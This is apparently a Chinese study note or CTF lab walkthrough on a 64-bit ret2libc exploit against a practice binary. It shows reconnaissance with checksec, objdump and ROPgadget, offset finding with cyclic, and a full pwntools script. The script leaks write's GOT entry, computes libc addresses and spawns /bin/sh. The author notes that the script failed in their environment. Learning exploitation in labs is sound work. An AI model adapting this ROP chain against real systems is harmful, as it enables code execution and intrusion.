# Ret2Libc 64

+++

**Attention:** 在32位程序中，参数的传递是通过栈来实现的；但是在64位系统中通过寄存器来传递参数；主要使用 rdi，rsi，rdx，rcx，r8，r9 来传递 一到六个参数

**要注意，传参使用的是寄存器，所以要使用gadgets的链的方式实现，而不是跟前面一样使用栈传参，只需压入栈，通过栈调用即可**

+++



### 检查程序

#### Checksec检查

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-16_20-48-12.png)

通过`checksec`检查，可以查看该程序启动NX保护，进一步使用`file` 命令 来查看程序的信息，可以得知该程序为动态链接



#### Objdump使用

首先查找目标函数，system，看看程序中是否有该函数

```
objdump -d -j .plt ./ret2libc1_64
objdump -d -j .plt ./ret2libc1_64 | grep system
```

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-18_10-06-00.png)



#### ROPgadget 查询相关字符串

查询字符串"/bin/sh"

```
ROPgadget --binary ./ret2libc1_64 --string "/bin/sh"
```

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-18_10-14-05.png)



#### Ldd查看程序依赖

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-18_10-30-07.png)



### 程序逆向

由于该程序与32位程序基本一致，只是编译方式不同，所以不在过多叙述，参见32位程序的文档



### 溢出点查找

#### 生成字符串

使用指令生成长度为200的字符串，然后gdb调试程序，并运行，输入可得到溢出处

```python
cyclic 200
```

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-18_10-25-27.png)



由于该程序为64 位的，但cyclic仅支持32位，即四字节的地址查询，所有8字节地址根据小端序，要娶后四个字节作为地址，或者字符串的前四个字符，如上图红线标明所示。

```
cyclic -l 0x61666161
cyclic -l aafa
```

由此得到偏移量为18；



### ROPgadget查询

为了得到Got地址，我们需要使用`write`来泄露我们需要的got地址，`write`地址原型如下

```c
write(1,"str",5) #第二个参数，说明要输出的值，第三个参数说明要输出的值的长度
```

> 相对于32位程序使用后栈传参，在64位程序中采用寄存器传参，所以我们需要如下几个gadgets

```
pop rdi,ret  # 参数1
pop rsi,ret  #参数 got表地址
pop rdx,ret  #
```



```
ROPgadget --binary ./ret2libc1_64 --only "pop|ret"|grep rdi    #0x00000000004005e3
ROPgadget --binary ./ret2libc1_64 --only "pop|ret"|grep rsi    #0x00000000004005e1
ROPgadget --binary ./ret2libc1_64 --only "pop|ret"|grep rdx   #此处查不到
```

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-19_13-58-39.png)

**在查找rdx设置时，发现无对应gadgets，由于该参数对应输出值长度，可以先不用设置，因为rdx中可能会有上次遗留值，加以利用**



### Payload

**Attention：该脚本不成功，动态调试发现RDX寄存器值为0，无法输出所需参数，因为缺少设定RDX的gadget所以，无法修改，参考文档，亦无对rdx的设定，但是存储的垃圾数据非0，可用于输出，但我的计算机，可能因为环境问题，rdx值为0，无法继续**

```python

from pwn import *
context(arch = "amd64",os ="linux",log_level = "debug")

p = process("./ret2libc1_64")
e = ELF("./ret2libc1_64")
offset = 18

write_plt_addr = e.plt["write"]
write_got_addr = e.got["write"]

vul_addr = e.symbols["vul"]

#0x00000000004005e3 : pop rdi ; ret
#0x00000000004005e1 : pop rsi ; pop r15 ; ret
pop_rdi_addr = 0x04005e3
pop_rsi_r15_addr = 0x4005e1
Payload1 =offset*b'A' + p64(pop_rdi_addr) + p64(1) + p64(pop_rsi_r15_addr) + p64(write_got_addr) + p64(1) + p64(write_plt_addr) + p64(vul_addr)

p.sendlineafter("hello",Payload1)
print("-----------------")

write_addr = u64(p.recv()[0:8].ljust(8,'\x00'))
print("-----------------")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_base = write_addr - libc.symbols["write"]
sys_addr = libc_base + libc.symbols["system"]
bin_sh_addr = libc_base + next(libc.search(b"/bin/sh"))

Payload2 =offset*b'A' + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(sys_addr)
print("------------------")
p.sendline(Payload2)
p.interactive()


```



